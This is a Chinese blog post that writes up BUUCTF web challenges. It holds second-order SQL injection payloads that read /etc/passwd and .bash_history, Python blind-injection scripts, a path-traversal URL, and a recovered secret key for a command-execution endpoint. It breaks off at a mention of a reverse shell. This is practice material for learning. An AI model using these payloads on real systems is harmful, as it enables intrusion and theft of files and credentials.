<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>ctf刷题-第一周题目 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">ctf刷题-第一周题目</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/">2022-03-28</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF%EF%BC%8C%E5%88%B7%E9%A2%98/">CTF，刷题</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
<h1 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h1><p><strong>Web方向：</strong></p>
<p>[b01lers2020]Welcome to Earth</p>
<p>[网鼎杯 2018]Comment</p>
<p>[GYCTF2020]Ezsqli</p>
<p>[网鼎杯 2020 白虎组]PicDown</p>
<p>[watevrCTF-2019]Cookie Store</p>
<p>[SWPUCTF 2018]SimplePHP</p>
<p>[WUSTCTF2020]CV Maker</p>
<p>[HarekazeCTF2019]encode_and_encode</p>
<p>[红明谷CTF 2021]write_shell</p>
<p>[SUCTF 2019]EasyWeb</p>
<p>[RootersCTF2019]I_&lt;3_Flask</p>
<p>[NCTF2019]SQLi</p>
<p>[NPUCTF2020]ezinclude</p>
<p>[CISCN2019 华东南赛区]Double Secret</p>
<h1 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h1><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>进去后，它会直接提示我，我die了，但是我们可以注意到它有个一闪而过的画面。</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203228318.png" alt="image-20220328203228318"></p>
<p>在这个页面没有发现，使用burp抓包</p>
<p>抓到</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328203639569.png" alt="image-20220328203639569"></p>
<p>查看源代码，发现了个有趣的路径</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204251360.png" alt="image-20220328204251360"></p>
<p>继续用burp抓包打开</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204549649.png" alt="image-20220328204549649"></p>
<p>这两个都点击后，没有效果</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204655545.png" alt="image-20220328204655545"></p>
<p>查看下源代码，发现一个可疑路径</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204718322.png" alt="image-20220328204718322"></p>
<p>进入后，界面如下</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204815035.png" alt="image-20220328204815035"></p>
<p>点击按钮，又会die</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204844208.png" alt="image-20220328204844208"></p>
<p>继续查看源代码，无限套娃呗</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328204931097.png" alt="image-20220328204931097"></p>
<p>进去</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205009037.png" alt="image-20220328205009037"></p>
<p>点击continue<br><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205120224.png" alt="image-20220328205120224"></p>
<p>要选择一个正确的数字，但是太多了吧，先看看源代码吧，发现如下js代码</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205425890.png" alt="image-20220328205425890"></p>
<p>嘿嘿，不用一个个试了，直接到open目录</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205558332.png" alt="image-20220328205558332"></p>
<p>继续查看源代码，发现fight目录</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205711090.png" alt="image-20220328205711090"></p>
<p>进入，一个可怕的外星人</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205745540.png" alt="image-20220328205745540"></p>
<p>继续查看源代码</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328205854907.png" alt="image-20220328205854907"></p>
<p>发现flag的顺序被打算，想要反解函数不现实，尝试全排列</p>
<pre><code>itertools.permutations()：就是返回可迭代对象的所有数学全排列方式,它以任意迭代作为参数，并始终返回生成元组的迭代器。它没有(也不应该)特殊的字符串。要获得字符串列表，您可以自己加入元组： list(map(&quot;&quot;.join, itertools.permutations(&#39;1234&#39;)))
</code></pre>
<pre><code class="python">from itertools import permutations
flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]
item = permutations(flag)
for i in item:
    #print (i)
    k=&quot;&quot;.join(i)
    #print(k)
    if k.startswith(&#39;pctf&#123;hey_boys&#39;) and k[-1]==&#39;&#125;&#39;:
        print(k)
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328215044738.png" alt="image-20220328215044738"></p>
<p>找到可能的flag，尝试即可</p>
<p>最终flag为</p>
<pre><code>pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;
</code></pre>
<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>需要登录才能发帖</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231641292.png" alt="image-20220328231641292"></p>
<p>.给了账号和密码前几位，直接burp爆破</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231742892.png" alt="image-20220328231742892"></p>
<p>成功爆破出密码</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328231810749.png" alt="image-20220328231810749"></p>
<p>没发现什么有用的，用dirsearch扫一下目录，注意，由于buu很容易崩溃，要降低速度</p>
<pre><code>python dirsearch.py -u http://bc06d5bc-c6b1-49d6-b004-e2f130e630ae.node4.buuoj.cn:81/ -e php -t 2 -s 0.2 -o C:\User\Sakura\Desktop\2.txt
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232440677.png" alt="image-20220328232440677"></p>
<p>发现git泄露,使用githack扒出源码</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220328232710003.png" alt="image-20220328232710003"></p>
<pre><code class="php">&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;
    header(&quot;Location: ./login.php&quot;);
    die();
&#125;
if(isset($_GET[&#39;do&#39;]))&#123;
switch ($_GET[&#39;do&#39;])
&#123;
case &#39;write&#39;:
    break;
case &#39;comment&#39;:
    break;
default:
    header(&quot;Location: ./index.php&quot;);
&#125;
&#125;
else&#123;
    header(&quot;Location: ./index.php&quot;);
&#125;
?&gt;
</code></pre>
<p>但是这段代码明显不完整</p>
<p>使用(这里推荐使用linux，我用windows出现了错误)</p>
<pre><code>git log --all
</code></pre>
<p>查一下之前提交的版本</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000637723.png" alt="image-20220329000637723"></p>
<p>恢复到初始版本</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329000916068.png" alt="image-20220329000916068"></p>
<p>成功得到完整源码</p>
<pre><code class="php">&lt;?php
include &quot;mysql.php&quot;;
session_start();
if($_SESSION[&#39;login&#39;] != &#39;yes&#39;)&#123;
    header(&quot;Location: ./login.php&quot;);
    die();
&#125;
if(isset($_GET[&#39;do&#39;]))&#123;
switch ($_GET[&#39;do&#39;])
&#123;
case &#39;write&#39;:
    $category = addslashes($_POST[&#39;category&#39;]);
    $title = addslashes($_POST[&#39;title&#39;]);
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into board
            set category = &#39;$category&#39;,
                title = &#39;$title&#39;,
                content = &#39;$content&#39;&quot;;
    $result = mysql_query($sql);
    header(&quot;Location: ./index.php&quot;);
    break;
case &#39;comment&#39;:
    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);
    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num&gt;0)&#123;
    $category = mysql_fetch_array($result)[&#39;category&#39;];
    $content = addslashes($_POST[&#39;content&#39;]);
    $sql = &quot;insert into comment
            set category = &#39;$category&#39;,
                content = &#39;$content&#39;,
                bo_id = &#39;$bo_id&#39;&quot;;
    $result = mysql_query($sql);
    &#125;
    header(&quot;Location: ./comment.php?id=$bo_id&quot;);
    break;
default:
    header(&quot;Location: ./index.php&quot;);
&#125;
&#125;
else&#123;
    header(&quot;Location: ./index.php&quot;);
&#125;
?&gt;
</code></pre>
<p>开始审计代码</p>
<p>先介绍下addslashes函数</p>
<pre><code>addslashes() 函数在指定的预定义字符前添加反斜杠。这些字符是单引号（&#39;）、双引号（&quot;）、反斜线（\）与NUL（NULL字符）。
</code></pre>
<p>逻辑其实很清晰</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329003323533.png" alt="image-20220329003323533"></p>
<p>当我们访问一个页面，取出这个页面中category的值然后接受content的值，插入到该页面。但是问题就出在，此代码只对用户输入的值做了转义，而绝对信任从服务器中取出的值，这就导致了二次注入。所以我们要想办法闭合sql语句，使其可以执行我们恶意的sql语句。</p>
<p>所以我们要对发帖处的categories做特殊输入</p>
<pre><code>0&#39;,content = database(), /*
</code></pre>
<p>然后在留言处输入</p>
<pre><code>*/#
</code></pre>
<p>这时候的sql语句就变为</p>
<pre><code>$sql = &quot;insert into comment
        set category = &#39;0&#39;,content = &#39;database()&#39;/*&#39;,
        content = &#39;*/#&#39;,
        bo_id = &#39;$bo_id&#39;&quot;;
</code></pre>
<p>简化后</p>
<pre><code>$sql = &quot;insert into comment set category = &#39;0&#39;,content = &#39;database()&#39;,bo_id = &#39;$bo_id&#39;&quot;;
</code></pre>
<p>这样通过在category构造，可以把content替换成我们想要的语句</p>
<p>我们来看一下执行效果</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005247027.png" alt="image-20220329005247027"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005310132.png" alt="image-20220329005310132"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005321316.png" alt="image-20220329005321316"></p>
<p>成功爆出了数据库</p>
<p>查看一下权限</p>
<pre><code>0&#39;,content = user(), /*
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005602357.png" alt="image-20220329005602357"></p>
<p>最高权限，可以尝试load_file()读取文件</p>
<pre><code>0&#39;,content = load_file(&#39;/etc/passwd&#39;), /*
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329005942676.png" alt="image-20220329005942676"></p>
<p>我们发现www用户(一般和网站操作相关的用户，由中间件创建)在/home/www目录,读取这下面的.bash_history文件</p>
<pre><code>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。
</code></pre>
<pre><code>0&#39;,content = load_file(&#39;/home/www/.bash_history&#39;), /*
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010244317.png" alt="image-20220329010244317"></p>
<p>我们可以看到它解压了一个html.zip，删除html.zip,然后整个文件夹复制到/var/www/html里，然后删除.DS_Store</p>
<pre><code>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。
</code></pre>
<p>它还有一份存在于在/tmp//html/目录中，构造sql语句进行读取</p>
<pre><code>0&#39;,content = load_file(&#39;/tmp/html/.DS_Store&#39;), /*
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329010811271.png" alt="image-20220329010811271"></p>
<p>这里文件太多，无法完全显示，进行十六进制转换</p>
<pre><code>0&#39;,content = hex(load_file(&#39;/tmp/html/.DS_Store&#39;)), /*
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329011204300.png" alt="image-20220329011204300"></p>
<p>解码</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013046184.png" alt="image-20220329013046184"></p>
<p>发现可疑文件</p>
<pre><code>flag_8946e1ff1ee3e40f.php
</code></pre>
<p>构造sql语句进行读取</p>
<pre><code>0&#39;,content = load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;), /*
</code></pre>
<p>这里有个坑，/tmp/html/flag_8946e1ff1ee3e40f.php的flag是假flag，还是要当当前运行的网站目录下读取</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013441800.png" alt="image-20220329013441800"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329013451988.png" alt="image-20220329013451988"></p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考察sql注入</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161851618.png" alt="image-20220329161851618"></p>
<p>测试一下</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329161953080.png" alt="image-20220329161953080"></p>
<p>有waf，fuzz一下</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162032033.png" alt="image-20220329162032033"></p>
<p>发现很多关键词被过滤了</p>
<p>考虑盲注，测试一下</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162428599.png" alt="image-20220329162428599"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162354207.png" alt="image-20220329162354207"></p>
<p>确认了盲注的存在</p>
<pre><code>为什么加上||1=1后，值会变为Nu1L后呢，这里牵扯到运算顺序，这是我之前百思不得其解的一点，后门才想起来
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329162630562.png" alt="image-20220329162630562"></p>
<p>我们可以看到比较运算的优先级是高于or的，所以会先判断右边的值是否为真，如果为真就不会再看左边了。</p>
<p>总之我们确定了要从盲注入手，但还有一个关键点，那就是information这个表被禁用，我们需要从其他表中获取我们需要的内容。</p>
<p><strong>1.利用mysql5.7新增的sys.schema_auto_increment_columns</strong></p>
<pre><code> 这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名

以下为该视图的所有列
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141522482.png" alt="img"></p>
<p><strong>2.sys.schema_table_statistics_with_buffer</strong></p>
<pre><code> 这是sys数据库下的视图，里面存储着所有数据库所有表的统计信息

  与它表结构相似的视图还有

  sys.x$schema_table_statistics_with_buffer

  sys.x$schema_table_statistics

  sys.x$ps_schema_table_statistics_io

以下为该视图的常用列（全部列有很多很多)
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141702221.png" alt="img"></p>
<p><strong>3.mysql默认存储引擎innoDB携带的表</strong></p>
<pre><code>  mysql.innodb_table_stats

  mysql.innodb_index_stats

  两表均有database_name和table_name字段，可以利用
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/20201019141811114.png" alt="img"></p>
<p>盲注需要用二进制跑才能提高效率，贴上写的盲注脚本，我太菜了写一个要半天时间</p>
<pre><code class="python">import time
import requests
url = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;
i = 0
result = &#39;&#39;
for i in range(1,2000):
    min = 32
    max = 128
    mid = (min + max) // 2
    while min &lt; max:
        payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(i, mid)
        print(payload)
        data = &#123;
            &quot;id&quot;: payload
        &#125;
        res = requests.post(url, data)
        if &quot;Error&quot; in res.text:
            min = mid + 1
        else:
            max = mid
        mid = (min + max) // 2
    result += chr(int(mid))
    print(result)
    time.sleep(0.5)
</code></pre>
<p>最好的办法是背下来模板，这样真正的比赛时才能较快写题。</p>
<p>最终得到两个表</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329180202611.png" alt="image-20220329180202611"></p>
<p>接下来就要从表中拿flag</p>
<p>下面要用到<strong>无列名注入</strong></p>
<p>为什么要采用这个注入呢，是因为sys.schema_table_statistics_with_buffer中只有表的信息，并没有列的信息，因此无法使用常规的方法。</p>
<p>关于无列名注入，首先我们来看一个例子</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211549667.png" alt="image-20220329211549667"></p>
<p>这代表字符串的大小于长短无关，而与首字母(如果首字母相同则继续向下比大小)的ascii有关</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329211742422.png" alt="image-20220329211742422"></p>
<p>由这个我们就能构造出payload</p>
<p>先来判断下字段</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213941106.png" alt="image-20220329213941106"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329213956411.png" alt="image-20220329213956411"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220329214035443.png" alt="image-20220329214035443"></p>
<p>由此可判断字段为两个</p>
<p>payload</p>
<pre><code>id=1||((select 1,&#123;0&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))
</code></pre>
<p>代码:</p>
<p>暴力</p>
<pre><code class="python">import time
import requests
url = &quot;http://f7bc77b0-cab8-4b62-a524-0b593aa80d8b.node4.buuoj.cn:81/index.php&quot;
value = &#39;&#39;
def get_flag(char,value):
    return value+char

for m in range(1,2000):
    for i in range(32,128):
        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;))&gt;(select * from f1ag_1s_h3r3_hhhhh)&#39;.format(get_flag(chr(i), value))
        print(payload)
        data = &#123;
            &quot;id&quot;: payload
        &#125;
        res = requests.post(url, data)
        time.sleep(0.5)
        if &quot;Nu1L&quot; in res.text:
            value += chr(i-1)
            print(value)
            break
</code></pre>
<h2 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h2><p><strong>非预期解</strong></p>
<p>这题做的很奇妙，，，直接非预期解了</p>
<pre><code>e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/page?url=../../../../flag
</code></pre>
<p>得到一个图片，拖到010editor，flag直接出现</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330004918193.png" alt="image-20220330004918193"></p>
<p><strong>预期解</strong></p>
<p>还是学习下正规思路吧</p>
<p>首先应该读取下进程信息</p>
<pre><code>在/proc 文件系统中，每一个进程都有一个相应的文件  。下面是/proc 目录下的一些重要文件  ：
/proc/pid/cmdline  包含了用于开始进程的命令  ；
/proc/pid/cwd 包含了当前进程工作目录的一个链接  ；
/proc/pid/environ  包含了可用进程环境变量的列表  ；
/proc/pid/exe  包含了正在进程中运行的程序链接；
/proc/pid/fd/  这个目录包含了进程打开的每一个文件的链接；
/proc/pid/mem  包含了进程在内存中的内容；
/proc/pid/stat 包含了进程的状态信息；
/proc/pid/statm  包含了进程的内存使用信息。 
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010223445.png" alt="image-20220330010223445"></p>
<p>可以看到刚开始执行了</p>
<pre><code>python2 app.py
</code></pre>
<p>我们来读取下app.py的源码</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330010349857.png" alt="image-20220330010349857"></p>
<pre><code class="python">from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = &quot;/tmp/secret.txt&quot;
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route(&#39;/&#39;)
def index():
    return render_template(&#39;search.html&#39;)


@app.route(&#39;/page&#39;)
def page():
    url = request.args.get(&quot;url&quot;)
    try:
        if not url.lower().startswith(&quot;file&quot;):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype=&#39;application/octet-stream&#39;)
            response.headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=beautiful.jpg&#39;
            return response
        else:
            value = &quot;HACK ERROR!&quot;
    except:
        value = &quot;SOMETHING WRONG!&quot;
    return render_template(&#39;search.html&#39;, res=value)


@app.route(&#39;/no_one_know_the_manager&#39;)
def manager():
    key = request.args.get(&quot;key&quot;)
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get(&quot;shell&quot;)
        os.system(shell)
        res = &quot;ok&quot;
    else:
        res = &quot;Wrong Key!&quot;

    return res


if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=8080)
</code></pre>
<p>linux里如果没有关闭文件会放在内存里，就算你remove掉了<strong>在/proc/[pid]/fd下还是会保存</strong></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012552404.png" alt="image-20220330012552404"></p>
<p>找到了密钥</p>
<pre><code>8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=
</code></pre>
<p>结果是无回显rce</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330012910567.png" alt="image-20220330012910567"></p>
<p>使用反弹shell</p>
